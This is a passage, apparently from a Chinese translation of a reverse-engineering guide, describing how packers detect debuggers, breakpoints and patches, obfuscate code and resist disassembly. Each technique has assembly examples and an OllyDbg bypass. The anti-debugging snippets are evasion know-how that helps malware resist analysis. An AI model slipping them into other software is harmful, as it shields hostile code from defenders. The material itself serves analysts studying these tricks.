<h3 id="2-12_OllyDbg:Guard_Pages">2.12 OllyDbg:Guard Pages</h3><p>这种检测方式只针对OllyDbg，因为这和Ollydbg设置内存访问/写断点的特点相关。<br>除了硬件断点和软件断点之外，OllyDbg还允许内存访问/写断点；这种类型的断点是通过<a href="http://msdn2.microsoft.com/en-us/library/aa366549.aspx" target="_blank" rel="external">Guard Pages</a>实现的。简单的说，guard pages提供了一种当内存被访问的时候能被通知的方法。<br>Guard pages通过PAGE_GUARD内存熟悉设置，如果guard page所在的地址被访问将会触发一个STATUS_GUARD_PAGE_VIOLATION (0x80000001)异常。壳检测的原理是如果进程正在被OllyDbg调试，当guard page被访问的时候将没有异常抛出，这个异常访问将会被当作一个内存断点。<br><em>例子</em><br>在下面的示例代码中，分配了一段内存，在这段内存中存一段代码然后设置这段内存属性为PAGE_GUARD属性。然后将标志位(EAX)初始化为0，然后在这段page pages中执行代码触发STATUS_GUARD_PAGE_VIOLATION异常，如果正在被OllyDbg调试，标志位不会被改变，因为异常处理函数不会被调用。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; set up exception handler&#10;push    .exception_handler&#10;push    dword [fs:0]&#10;mov     [fs:0], esp&#10;&#10;; allocate memory&#10;push    PAGE_READWRITE&#10;push    MEM_COMMIT&#10;push    0x1000&#10;push    NULL&#10;call    [VirtualAlloc]&#10;test    eax,eax&#10;jz      .failed&#10;mov     [.pAllocatedMem],eax&#10;&#10;; store a RETN on the allocated memory&#10;mov     byte [eax],0xC3&#10;&#10;; then set the PAGE_GUARD attribute of the allocated memory&#10;lea     eax,[.dwOldProtect]&#10;push    eax&#10;push    PAGE_EXECUTE_READ | PAGE_GUARD&#10;push    0x1000&#10;push    dword [.pAllocatedMem]&#10;call    [VirtualProtect]&#10;&#10;; set marker (EAX) as 0&#10;xor     eax,eax&#10;&#10;; trigger a STATUS_GUARD_PAGE_VIOLATION exception&#10;call    [.pAllocatedMem]&#10;&#10;; check if marker had not been changed (exception handler not called)&#10;test    eax,eax&#10;je      .debugger_found&#10;:::&#10;&#10;.exception_handler&#10;;EAX = CONTEXT record&#10;mov     eax,[esp+0xc]&#10;;set marker (CONTEXT.EAX) to 0xffffffff&#10;; to signal that the exception handler was called&#10;mov     dword [eax+0xb0],0xffffffff&#10;xor     eax,eax&#10;retn</span><br></pre></td></tr></table></figure></p>
<p><em>解决方案</em><br>因为guard pages会触发一个异常，逆向者可以故意触发一个异常，这样一场处理函数会被调用。在上面的例子中逆向者可以使用“INT3”加“RETN”替换RETN指令，一旦INT3被执行，可以通过Shift+F9强制调试器执行异常处理函数，然后异常处理函数执行之后，EAX将会被设置为正确的值,最后RETN指令也会正常执行。<br>如果异常处理函数确实是检查STATUS_GUARD_PAGE_VIOLATION异常，逆向者可以在异常处理函数中设置一个断点，然后修改ExceptionRecord参数，具体来说就是将ExceptionCode手动设置为STATUS_GUARD_PAGE_VIOLATION。</p>
<h2 id="3-断点和PARCHING检测技术">3.断点和PARCHING检测技术</h2><p>这一节将会列举常见检测软件断点、硬件断点及Patch的方法。</p>
<h3 id="3-1_软件断点检测">3.1 软件断点检测</h3><p>软件断点是通过将断点地址处的指令修改为0xcc(INT3断点)实现的。壳可以在壳代码或则API中扫描0xcc指令检测软件断点。<br><em>例子</em><br>一种检测方式可以像下面一样简单：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cld&#10;mov     edi,Protected_Code_Start&#10;mov     ecx,Protected_Code_End - Protected_Code_Start&#10;mov     al,0xcc&#10;repne   scasb&#10;jz      .breakpoint_found</span><br></pre></td></tr></table></figure></p>
<p>一些壳会对比较指令做一些操作，使得检测指令不是很明显，例如：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(byte XOR 0x55 == 0x99) then breakpoint found&#10;Where: 0x99 == 0xCC XOR 0x55</span><br></pre></td></tr></table></figure></p>
<p><em>解决方案</em><br>如果软件断点容易被检测可以使用硬件断点替代，要在系统API代码上设置断点，如果壳会检测API上的断点，可以UNICODE版本API上设置断点，因为ANSI版本API最终会调用UNICODE版本API（如使用LoadLibraryExW替代LoadLibraryA），或则使用Native API替代（如ntdll!LdrLoadDll）。</p>
<h3 id="3-2_硬件断点检测">3.2 硬件断点检测</h3><p>另一种类型的断点是硬件断点，硬件断点通过调试寄存器（debug registers）设置，寄存器包含Dr0到Dr7。其中DR0-Dr3用于记录断点地址信息，最多4个，DR6用来标识断点是否被触发，而Dr7用于包含用于控制4个断点的标识，如启用/禁用断电及读/写点。<br>因为在Ring3不能直接访问调试寄存器，因此硬件断点需要一些代码才能检测。因为CONTEXT结构中包含调试寄存器，所以壳主要利用CONTEXT结构检测硬件断点。CONTEXT结构可以通过传递给异常处理函数的参数ContextRecord访问。<br><em>例子</em><br>下面是一个查询调试寄存器的示例代码<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; set up exception handler&#10;push    .exception_handler&#10;push    dword [fs:0]&#10;mov     [fs:0], esp&#10;&#10;; eax will be 0xffffffff if hardware breakpoints are identified&#10;xor     eax,eax&#10;&#10;; throw an exception&#10;mov     dword [eax],0&#10;&#10;; restore exception handler&#10;pop     dword [fs:0]&#10;add     esp,4&#10;&#10;; test if EAX was updated (breakpoint identified)&#10;test    eax,eax&#10;jnz     .breakpoint_found&#10;:::&#10;&#10;.exception_handler&#10;;EAX = CONTEXT record&#10;mov     eax,[esp+0xc]&#10;&#10;;check if Debug Registers Context.Dr0-Dr3 is not zero&#10;cmp     dword [eax+0x04],0&#10;jne     .hardware_bp_found&#10;cmp     dword [eax+0x08],0&#10;jne     .hardware_bp_found&#10;cmp     dword [eax+0x0c],0&#10;jne     .hardware_bp_found&#10;cmp     dword [eax+0x10],0&#10;jne     .hardware_bp_found&#10;jmp     .exception_ret&#10;&#10;.hardware_bp_found&#10;;set Context.EAX to signal breakpoint found&#10;mov     dword [eax+0xb0],0xffffffff&#10;.exception_ret&#10;;set Context.EIP upon return&#10;add     dword [eax+0xb8],6&#10;xor     eax,eax&#10;retn</span><br></pre></td></tr></table></figure></p>
<p>一些壳会将解密密钥一部分放在调试寄存器，这样调试寄存器会被初始化为一个特定的值或则为0，如果被解密的代码是需要被脱壳的导入表或则可执行代码，当这些调试寄存器被修改了，壳解密将会失败并且会因为无效指令导致异常而意外终止。<br><em>解决方案</em><br>如果软件断点没有被检测，可以使用软件断点代替。同时也可以使用ollydbg的读/写内存断点代替。如果需要设置API断点可以在UNICODE/Native版本API设置软件断点。</p>
<h3 id="3-3_通过代码校验和检测Patch（壳代码完整性校验）">3.3 通过代码校验和检测Patch（壳代码完整性校验）</h3><p>代码完整性校验是校验壳代码是否被修改，修改可能是因为patch了壳反调试函数或则设置了软件断点。壳完整性校验通过代码校验和实现，校验和算法可以是简单的校验和也可以是复杂的散列算法。<br><em>例子</em><br>下面是一个计算校验和的简单计算方式：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     esi,Protected_Code_Start&#10;mov     ecx,Protected_Code_End - Protected_Code_Start&#10;xor     eax,eax&#10;&#10;.checksum_loop&#10;movzx   ebx,byte [esi]&#10;add     eax,ebx&#10;rol     eax,1&#10;inc     esi&#10;loop    .checksum_loop&#10;cmp     eax,dword [.dwCorrectChecksum]&#10;jne     .patch_found</span><br></pre></td></tr></table></figure></p>
<p><em>解决方案</em><br>如果是软件断点被校验和检测到了，可以用硬件断点替代。如果因为patch代码被检测到了，逆向人员可以在patch位置代码设置内存访问断点确定校验和检测函数的地址，一旦找到了校验和函数就可以将校验和修改为正常值或则直接修改校验和失败的标志位。</p>
<h2 id="4-反分析技术">4.反分析技术</h2><p>反分析技术主要目的是减缓逆向人员分析和理解壳代码和被壳保护的代码，主要技术如加密/压缩、垃圾指令、乱序代码（permutation）及反汇编技术。这些反分析技术主要目的是去混淆代码、使人知难而退和浪费分析者的时间，这就需要分析者有耐心、足够聪明等特性才能绕过这些反分析技术。</p>
<h3 id="4-1-_加密和压缩">4.1. 加密和压缩</h3><p>加密和压缩式反分析最基本的技术，最初的目的是防止分析者毫无困难的使用反汇编工具分析被保护的代码。<br><strong>加密</strong>：壳通常会加密壳代码及被保护的代码。加密算法因壳的不同而各异，从非常简单的循环异或加密到运算量很大的复杂算法。一些多态型的壳在不同的样本会使用不同的加密算法，解密算法也不同，生成的每一个样本都非常不一样，并且可能影响壳识别工具的正确性。<br>解密函数通常是一个执行取数据、计算数据、存储数据的循环，下面是一个简单揭秘函数包含几条简单的XOR操作去解密一个被加密的DWORD值。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040A07C LODS   DWORD PTR DS:[ESI]&#10;0040A07D XOR    EAX,EBX&#10;0040A07F SUB    EAX,12338CC3&#10;0040A084 ROL    EAX,10&#10;0040A087 XOR    EAX,799F82D0&#10;0040A08C STOS   DWORD PTR ES:[EDI]&#10;0040A08D INC    EBX&#10;0040A08E LOOPD  SHORT 0040A07C ;decryption loop</span><br></pre></td></tr></table></figure></p>
<p>下面是另一个多态壳解密函数<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00476056 MOV    BH,BYTE PTR DS:[EAX]  //&#10;00476058 INC    ESI&#10;00476059 ADD    BH,0BD                //&#10;0047605C XOR    BH,CL                 //&#10;0047605E INC    ESI&#10;0047605F DEC    EDX&#10;00476060 MOV    BYTE PTR DS:[EAX],BH  //&#10;00476062 CLC&#10;00476063 SHL    EDI,CL&#10;::: More garbage code&#10;00476079 INC    EDX&#10;0047607A DEC    EDX&#10;0047607B DEC    EAX                   //&#10;0047607C JMP    SHORT 0047607E&#10;0047607E DEC    ECX                   //&#10;0047607F JNZ    00476056 ;decryption loop  //</span><br></pre></td></tr></table></figure></p>
<p>下面是另一个解密函数，和上面是同样的多态壳<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040C045 MOV    CH,BYTE PTR DS:[EDI]  //&#10;0040C047 ADD    EDX,EBX&#10;0040C049 XOR    CH,AL                //&#10;0040C04B XOR    CH,0D9               //&#10;0040C04E CLC&#10;0040C04F MOV    BYTE PTR DS:[EDI],CH //&#10;0040C051 XCHG   AH,AH&#10;0040C053 BTR    EDX,EDX&#10;0040C056 MOVSX EBX,CL&#10;::: More garbage code&#10;0040C067 SAR    EDX,CL&#10;0040C06C NOP&#10;0040C06D DEC    EDI                  //&#10;0040C06E DEC    EAX                  //&#10;0040C06F JMP    SHORT 0040C071&#10;0040C071 JNZ    0040C045 ;decryption loop  //</span><br></pre></td></tr></table></figure></p>
<p>上面两个多态壳解密代码例子，高亮（后面有//的）语句是主要的解密指令，剩下的指令都是些垃圾指令用来混淆逆向者的。注意寄存器是如何交换数据以及这两个加密函数是如何变换的。<br><strong>压缩</strong>：压缩的主要目的是减小可执行文件代码和数据的大小，原始可执行文件被压缩后它的可读字符串也将会被压缩，这样也有了混淆的作用。壳使用压缩软法的情况：UPX使用NRV、LZMA，FSG使用aPLib,Upack使用LZMA,yoda使用LZO。一些压缩引擎是免费非商业用途的，当用于商业用途时需要许可/注册。<br><em>解决方案</em><br>解密和解压缩函数循环都很容易绕过，逆向者只需要在解密/解压缩循环结束的地方设置一个断点。不过需要注意的是一些壳在解密循环可能会包含断点检测代码。</p>
<h3 id="4-2-_垃圾指令和代码扩展">4.2. 垃圾指令和代码扩展</h3><p><strong>垃圾指令</strong>：在壳的解码算法中插入垃圾指令是另一种混淆逆向分析者的有效办法。旨在隐藏代码真正的目的，包括解密函数、反分析函数如检测调试器。垃圾代码将检测调试器、断点、patch等代码隐藏在一大堆无用并且令人困惑的指令中，增加了这些反分析技术的有效性。除此之外，有效的垃圾代码看起来和正常代码很相似。<br><em>例子</em><br>下面是一个解密函数，在函数中插入了很多垃圾指令：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0044A21A JMP    SHORT sample.0044A21F&#10;0044A21C XOR    DWORD PTR SS:[EBP],6E4858D&#10;0044A223 INT    23&#10;0044A225 MOV    ESI,DWORD PTR SS:[ESP]&#10;0044A228 MOV    EBX,2C322FF0&#10;0044A22D LEA    EAX,DWORD PTR SS:[EBP+6EE5B321]&#10;0044A233 LEA    ECX,DWORD PTR DS:[ESI+543D583E]&#10;0044A239 ADD    EBP,742C0F15&#10;0044A23F ADD    DWORD PTR DS:[ESI],3CB3AA25&#10;0044A245 XOR    EDI,7DAC77F3&#10;0044A24B CMP    EAX,ECX&#10;0044A24D MOV    EAX,5ACAC514&#10;0044A252 JMP    SHORT sample.0044A257&#10;0044A254 XOR    DWORD PTR SS:[EBP],AAE47425&#10;0044A25B PUSH   ES&#10;0044A25C ADD    EBP,5BAC5C22&#10;0044A262 ADC    ECX,3D71198C&#10;0044A268 SUB    ESI,-4&#10;0044A26B ADC    ECX,3795A210&#10;0044A271 DEC    EDI&#10;0044A272 MOV    EAX,2F57113F&#10;0044A277 PUSH   ECX&#10;0044A278 POP    ECX&#10;0044A279 LEA    EAX,DWORD PTR SS:[EBP+3402713D]&#10;0044A27F DEC    EDI&#10;0044A280 XOR    DWORD PTR DS:[ESI],33B568E3&#10;0044A286 LEA    EBX,DWORD PTR DS:[EDI+57DEFEE2]&#10;0044A28C DEC    EDI&#10;0044A28D SUB    EBX,7ECDAE21&#10;0044A293 MOV    EDI,185C5C6C&#10;0044A298 MOV    EAX,4713E635&#10;0044A29D MOV    EAX,4&#10;0044A2A2 ADD    ESI,EAX&#10;0044A2A4 MOV    ECX,1010272F&#10;0044A2A9 MOV    ECX,7A49B614&#10;0044A2AE CMP    EAX,ECX&#10;0044A2B0 NOT    DWORD PTR DS:[ESI]</span><br></pre></td></tr></table></figure></p>
<p>上面这个例子中有用的指令只有下面这几句：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0044A225 MOV    ESI,DWORD PTR SS:[ESP]&#10;0044A23F ADD    DWORD PTR DS:[ESI],3CB3AA25&#10;0044A268 SUB    ESI,-4&#10;0044A280 XOR    DWORD PTR DS:[ESI],33B568E3&#10;0044A29D MOV    EAX,4&#10;0044A2A2 ADD    ESI,EAX&#10;0044A2B0 NOT    DWORD PTR DS:[ESI]</span><br></pre></td></tr></table></figure></p>
<p><strong>指令变换（Code Permutation）</strong>:code permutation是一种壳使用的比较高级的反分析技术。通过指令变换一些简单的指令将会被转换成一串相同功能的但是复杂的指令。<br>下面是一个简单的code permutation的例子，简单指令如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     eax,ebx&#10;test    eax,eax</span><br></pre></td></tr></table></figure></p>
<p>经过转换的等价功能的指令如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push    ebx&#10;pop     eax&#10;or      eax,eax</span><br></pre></td></tr></table></figure></p>
<p>结合垃圾指令，指令变换是一种有效的技术手段去减缓逆向者去理解被保护的代码。<br><em>例子</em><br>为了说明指令变换变换的作用，下面是一个检测调试器的函数，函数已经被指令变换并且在指令间插入了垃圾代码，代码如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004018A3 MOV    EBX,A104B3FA&#10;004018A8 MOV    ECX,A104B412&#10;004018AD PUSH   004018C1&#10;004018B2 RETN&#10;004018B3 SHR    EDX,5&#10;004018B6 ADD    ESI,EDX&#10;004018B8 JMP    SHORT 004018BA&#10;004018BA XOR    EDX,EDX&#10;004018BC MOV    EAX,DWORD PTR DS:[ESI]&#10;004018BE STC&#10;004018BF JB     SHORT 004018DE&#10;004018C1 SUB    ECX,EBX&#10;004018C3 MOV    EDX,9A01AB1F&#10;004018C8 MOV    ESI,DWORD PTR FS:[ECX]&#10;004018CB LEA    ECX,DWORD PTR DS:[EDX+FFFF7FF7]&#10;004018D1 MOV    EDX,600&#10;004018D6 TEST   ECX,2B73&#10;004018DC JMP    SHORT 004018B3&#10;004018DE MOV    ESI,EAX&#10;004018E0 MOV    EAX,A35ABDE4&#10;004018E5 MOV    ECX,FAD1203A&#10;004018EA MOV    EBX,51AD5EF2&#10;004018EF DIV    EBX&#10;004018F1 ADD    BX,44A5&#10;004018F6 ADD    ESI,EAX&#10;004018F8 MOVZX  EDI,BYTE PTR DS:[ESI]&#10;004018FB OR     EDI,EDI&#10;004018FD JNZ    SHORT 00401906</span><br></pre></td></tr></table></figure></p>
<p>上面的例子仅仅是一个简单的检测调试器的函数：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401081 MOV    EAX,DWORD PTR FS:[18]&#10;00401087 MOV    EAX,DWORD PTR DS:[EAX+30]&#10;0040108A MOVZX  EAX,BYTE PTR DS:[EAX+2]&#10;0040108E TEST   EAX,EAX&#10;00401090 JNZ    SHORT 00401099</span><br></pre></td></tr></table></figure></p>
<p><em>解决方案</em><br>垃圾指令和指令变换是一种无聊的浪费逆向时间的方式。因此知道在混淆技术中的隐藏代码是否值得去理解是很重要的（如只执行解密，壳的初始化等）。<br>避免去跟踪调试这些被混淆的代码是在壳经常使用的API上设置断点（如VirtualAlloc/VirtualProtect/LoadLibrary/GetProcAddress等）或则使用API logging工具记录那些API被使用，然后将这些API作为调试跟踪的标记。如果在调试跟踪过程中出现了什么异常（如调试器/断点被检测），这时候才去跟踪调试这部分代码。此外可以通过设置内存读/写断点找到那些试图去修改/访问受保护进程特定内存的代码，而不是通过大量调试跟踪代码去找到这部分函数。<br>最后，在虚拟机中使用ollydbg调试的时候可以通过快照记录特定的调试状态，如果调试过程中出了问题可以通过快照恢复到特定的调试状态。</p>
<h3 id="4-3-_反反汇编">4.3. 反反汇编</h3><p>混淆汇编是另一种混淆分析的方式。反汇编是一种有效的反静态分析技术，如果结合垃圾指令和指令变换会使其更加有效。<br>反汇编的一个例子是在代码中插入一个字节的垃圾指令，然后添加一个条件分支使代码执行到垃圾指令。然而条件分支的条件永远都是FALSE。因此垃圾指令永远都不会执行，但是会触发反汇编工具去反汇编垃圾指令所在的地址，最后导致反汇编错误输出。<br><em>例子</em><br>下面是一个简单的通过PEB检测调试器的代码，PEB.BeingDebugged检查代码中使用了一些反反汇编代码。高亮部分代码是主要的代码，剩余部分主要是反反汇编代码，通过使用垃圾指令0xff和假的条件跳转使反汇编错误反汇编垃圾指令，反汇编输出如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;Anti-disassembly sequence #1&#10;push    .jmp_real_01&#10;stc&#10;jnc     .jmp_fake_01&#10;retn&#10;.jmp_fake_01:&#10;db      0xff&#10;.jmp_real_01:&#10;;--------------------------&#10;mov eax,dword [fs:0x18]           //&#10;&#10;;Anti-disassembly sequence #2&#10;push    .jmp_real_02&#10;clc&#10;jc      .jmp_fake_02&#10;retn&#10;.jmp_fake_02:&#10;db      0xff&#10;.jmp_real_02:&#10;;--------------------------&#10;mov     eax,dword [eax+0x30]&#10;movzx   eax,byte [eax+0x02]&#10;test    eax,eax&#10;jnz     .debugger_found</span><br></pre></td></tr></table></figure></p>
<p>windbg的反汇编输出：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040194a 6854194000     push 0x401954&#10;0040194f f9             stc&#10;00401950 7301           jnb image00400000+0x1953 (00401953)&#10;00401952 c3             ret&#10;00401953 ff64a118       jmp dword ptr [ecx+0x18]&#10;00401957 0000           add [eax],al&#10;00401959 006864         add [eax+0x64],ch&#10;0040195c 194000         sbb [eax],eax&#10;0040195f f8             clc&#10;00401960 7201           jb image00400000+0x1963 (00401963)&#10;00401962 c3             ret&#10;00401963 ff8b40300fb6   dec dword ptr [ebx+0xb60f3040]&#10;00401969 40             inc eax&#10;0040196a 0285c0750731   add al,[ebp+0x310775c0]</span><br></pre></td></tr></table></figure></p>
<p>ollydbg反汇编输出：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040194A 68 54194000    PUSH 00401954&#10;0040194F F9             STC&#10;00401950 73 01          JNB SHORT 00401953&#10;00401952 C3             RETN&#10;00401953 FF64A1 18      JMP DWORD PTR DS:[ECX+18]&#10;00401957 0000           ADD BYTE PTR DS:[EAX],AL&#10;00401959 0068 64        ADD BYTE PTR DS:[EAX+64],CH&#10;0040195C 1940 00        SBB DWORD PTR DS:[EAX],EAX&#10;0040195F F8             CLC&#10;00401960 72 01          JB SHORT 00401963&#10;00401962 C3             RETN&#10;00401963 FF8B 40300FB6  DEC DWORD PTR DS:[EBX+B60F3040]&#10;00401969 40             INC EAX&#10;0040196A 0285 C0750731  ADD AL,BYTE PTR SS:[EBP+310775C0]</span><br></pre></td></tr></table></figure></p>
<p>最后是IAD的反汇编输出：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040194A            push (offset loc_401953+1)&#10;0040194F            stc&#10;00401950            jnb short loc_401953&#10;00401952            retn&#10;00401953 ; --------------------------------------------------------------&#10;00401953&#10;00401953 loc_401953: ; CODE XREF: sub_401946+A&#10;00401953 ; DATA XREF: sub_401946+4&#10;00401953            jmp dword ptr [ecx+18h]&#10;00401953            sub_401946 endp&#10;00401953&#10;00401953 ; --------------------------------------------------------------&#10;00401957            db 0&#10;00401958            db 0&#10;00401959            db 0&#10;0040195A            db 68h ; h&#10;0040195B            dd offset unk_401964&#10;0040195F            db 0F8h ; &#176;&#10;00401960            db 72h ; r&#10;00401961            db 1&#10;00401962            db 0C3h ; +&#10;00401963            db 0FFh&#10;00401964 unk_401964 db 8Bh ; &#239; ; DATA XREF: text:0040195B&#10;00401965            db 40h ; @&#10;00401966            db 30h ; 0&#10;00401967            db 0Fh&#10;00401968            db 0B6h ; ?&#10;00401969            db 40h ; @&#10;0040196A            db 2&#10;0040196B            db 85h ; &#224;&#10;0040196C            db 0C0h ; +&#10;0040196D            db 75h ; u</span><br></pre></td></tr></table></figure></p>
<p>注意分析这三个反汇编器/调试器是如何被陷入反反汇编中的，这些将会让逆向工作者很烦恼和困惑。这里仅仅描述了一种反反汇编的例子，还有几种其他的反反汇编技术。另外可以通过宏编写反反汇编代码，可以使汇编代码看起来比较整洁。<br>建议读者参考Eldad Eliam编写的一边优秀的关于逆向的书籍（Reversing: Secrects of Reverse Engineering），详细学习关于反反汇编及其他逆向技术。</p>
<h2 id="5-_对抗调试技术">5. 对抗调试技术</h2><p>这部分将列举壳主动对抗调试器的技术如当进程正在被调试时会突然中止或者断点失效等，和之前描述的技术相同，如果结合使用其他反分析技术将这部分代码隐藏会使这些技术更加有效。</p>
<h3 id="5-1-_通过异常使调试器错误执行和停止执行">5.1. 通过异常使调试器错误执行和停止执行</h3><p>一直线性的跟踪调试代码可以使逆向者更加轻松的掌握和理解代码的目的。因此，一些壳会采用多种技术使跟踪代码非线性的且耗时的。<br>一种常用的方式是在壳在恢复代码过程中抛出异常，通过抛出异常，这就需要逆向者明白异常执行的时候EIP将指向何处，以及异常处理函数执行之后EIP指向的位置。<br>此外，异常也是壳实现重复终止脱壳恢复代码的一种方式。当异常抛出时，如果进程正在被调试，调试器会暂停执行解包代码。<br>壳通常使用结构化异常处理（SEH）机制处理异常，较新版本的壳也会使用VEH异常处理。<br><em>例子</em><br>下面是一个示例代码，当循环执行后溢出标志位被ROL指令设置会抛出一个溢出异常（使用INTO指令），实现代码错误执行。但是因为溢出异是一个trap异常，EIP将执行JMP指令。如果逆向者使用OllyDbg并且逆向者没有将异常传递给异常处理函数（使用Shift+F7/F8/F9）并持续使用单步调试，逆向者将会进入到一个死循环中。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; set up exception handler&#10;push    .exception_handler&#10;push    dword [fs:0]&#10;mov     [fs:0], esp&#10;&#10;; throw an exception&#10;mov     ecx,1&#10;.loop:&#10;rol     ecx,1&#10;into&#10;jmp     .loop&#10;; restore exception handler&#10;pop     dword [fs:0]&#10;add     esp,4&#10;:::&#10;.exception_handler&#10;;EAX = CONTEXT record&#10;mov     eax,[esp+0xc]&#10;;set Context.EIP upon return&#10;add     dword [eax+0xb8],2&#10;xor     eax,eax&#10;retn</span><br></pre></td></tr></table></figure></p>
<p>壳常抛出的异常有访问异常（0xC0000005）、断点异常（0xC0000003）和单步异常（0xC0000004）。<br><em>解决方案</em></p>
<div align="center"><br><img src="/img/2018_0523_05_01.png" alt align="center"><br></div><br>对于壳使用异常捕获方式实现无条件跳转的代码，OllyDbg可以设置将异常自动传递给一场处理函数，配置方式为ptions -&gt;<br>Debugging Options -&gt; Exceptions。上图展示了配置的异常处理的截图对话框。逆向者也可以添加勾选框中未出现的自定义异常处理。<br>对在异常处理中执行重要操作的壳，逆向者可以在异常处理中设置断点，异常处理函数的地址可以在Ollydbg中使用View-&gt;SEH Chain查看，然后使用Shift+F7/F8/F9将执行权限交给异常处理函数。<br><br>### 5.2. 屏蔽输入<br>为了阻止逆向者操作调试器，壳会在主要的脱壳函数执行时使用user32!BlockInput()屏蔽键盘和鼠标输入，将这个操作隐藏在垃圾指令和反反汇编代码中，如果逆向者不能识别，壳的这种操作将会很有效。如果BlockInput执行了，系统将会像失去响应一样，会令逆向者非常困惑。<br>一个典型的例子就是当逆向者在函数GetProcAddress()中设置了一个断点，然后跳过几个垃圾代码的执行，这时候壳已经执行了BloockInput()。一旦GetProcAddress()断点命中，逆向者会突然发现自己不能操作调试器并会困惑刚刚发生了什么。<br><em>例子</em><br>BlockInput()需要一个布尔型参数fBlockIt。如果fBlockIt为true，键盘和鼠标事件将会被屏蔽，如果为false，键盘和鼠标屏蔽将会解锁。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; Block input&#10;push    TRUE&#10;call    [BlockInput]&#10;; ...Unpacking code...&#10;; Unblock input&#10;push    FALSE&#10;call    [BlockInput]</span><br></pre></td></tr></table></figure><br><br><em>解决方案</em><br>幸运的是这里有一个简单的方法绕过，直接patch BlockInput()的入口为RETN，下面是一个patch user32!BlockInput()入口的ollyscript。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpa     &#34;BlockInput&#34;, &#34;user32.dll&#34;&#10;mov     [$RESULT], #C20400# //retn 4</span><br></pre></td></tr></table></figure><br><br>Olly Advanced插件也有patch BlockInput()的选项。除此之外，也可以手动的使用CTRL+ALT+DELETE解锁输入屏蔽。<br><br>### 5.3. 对调试器隐藏线程<br>这项技术实现通过ntdll!NtSetInformationThread()，这个API主要常常被用来设置线程优先级。然而，这个API也可以用来阻止调试事件发送到调试器。<br>NtSetInformationThread()的参数如下所示，为了实现在调试器中隐藏线程，ThreadInformationClass参数需要设置为TheadHideFromDebugger (0x11)，ThreadHandle常设置为当前线程(0xfffffffe)：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS NTAPI NtSetInformationThread(&#10;                    HANDLE ThreadHandle,&#10;                    THREAD_INFORMATION_CLASS ThreadInformationClass,&#10;                    PVOID ThreadInformation,&#10;                    ULONG ThreadInformationLength&#10;                    );</span><br></pre></td></tr></table></figure><br><br>在NtSetInformationThread函数内部，ThreadHideFromDebugger参数将会设置ETHREAD（_ETHREAD）的HideThreadFromDebugger字段。一旦被设置了，函数DbgkpSendApiMessage()将不会被调用，DbgkpSendApiMessage函数的主要目的是将事件发往调试器。<br><em>例子</em><br>一个典型的调用NtSetInformationThread()函数的例子如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push    0 ;InformationLength&#10;push    NULL ;ThreadInformation&#10;push    ThreadHideFromDebugger ;0x11&#10;push    0xfffffffe ;GetCurrentThread()&#10;call    [NtSetInformationThread]</span><br></pre></td></tr></table></figure><br><br><em>解决方案</em><br>可以在ntdll!NtSetInformationThread()设置断点，一旦命中，逆向者可以操作EIP阻止API调用到内核中。也可以通过ollyscript脚本自动完成这个操作。另外Olly Advanced插件也有patch ntdll!NtSetInformationThread()函数的选项，如果参数ThreadInformationClass为HideThreadFromDebugger，函数只会直接返回而不会进入内核。<br><br>### 5.4. 禁用断点<br>另一种攻击调试器的方式为禁用调试器。为了禁用硬件断点，壳可以通过CONTEXT结构去修改调试寄存器。<br><em>例子</em><br>在下面例子中，调试寄存器将会被清零，实现方法是在异常处理函数中修改传递过来的CONTEXT记录。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; set up exception handler&#10;push    .exception_handler&#10;push    dword [fs:0]&#10;mov     [fs:0], esp&#10;&#10;; throw an exception&#10;xor     eax,eax&#10;mov     dword [eax],0&#10;; restore exception handler&#10;pop     dword [fs:0]&#10;add     esp,4&#10;:::&#10;.exception_handler&#10;;EAX = CONTEXT record&#10;mov     eax,[esp+0xc]&#10;;Clear Debug Registers: Context.Dr0-Dr3,Dr6,Dr7&#10;mov     dword [eax+0x04],0&#10;mov     dword [eax+0x08],0&#10;mov     dword [eax+0x0c],0&#10;mov     dword [eax+0x10],0&#10;mov     dword [eax+0x14],0&#10;mov     dword 